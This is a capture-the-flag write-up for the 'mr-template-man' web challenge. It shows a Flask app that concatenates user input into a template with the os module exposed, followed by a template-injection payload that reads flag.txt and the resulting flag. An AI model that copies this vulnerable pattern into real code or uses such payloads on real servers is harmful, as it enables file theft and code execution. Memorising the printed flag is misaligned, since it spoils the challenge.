# mr-template-man

[library.m0unt41n.ch/challenges/mr-template-man](https://library.m0unt41n.ch/challenges/mr-template-man) ![](../../resources/web.svg) ![](../../resources/easy.svg) 

# TL;DR

The code exposes `os` object in the context of the template rendering:

```python
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    content = request.args.get("content") or ""
    ctx = {
        "os": os
    }
    try:
        return render_template_string("""<!DOCTYPE html>
<html>
    <head>
        <title>Mr. Template Man</title>
    </head>
    <body>
        <h3>What do you have to say?</h3>
        <p>""" + content + """</p>
        <form action="/" method="GET">
            <input type="text" name="content" value="" />
            <input type="submit" />
        </form>
        <span>Server running as pid {{ os.getpid() }}</span>
    </body>
</html>
""", **ctx)
    except Exception as e:
        return render_template_string("""<!DOCTYPE html>
<html>
    <head>
        <title>Mr. Template Man</title>
    </head>
    <body>
        <h3>Oh no, something went wrong</h3>
        <p>Here are the details:</p>
        <span>{{ ex }}</span>
    </body>
</html>
""", ex=str(e))

app.run(host="0.0.0.0", port=5000)
```

...and we can freely add text to the template with the `content` variable
provided as the input field.

Therefore:

`{{ os.read(os.open("flag.txt", os.O_RDONLY), 1024) }}`

---

## `shc2023{3xpl01t_t3mpl4t35_w1th_0s_3dd8ca1f3}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
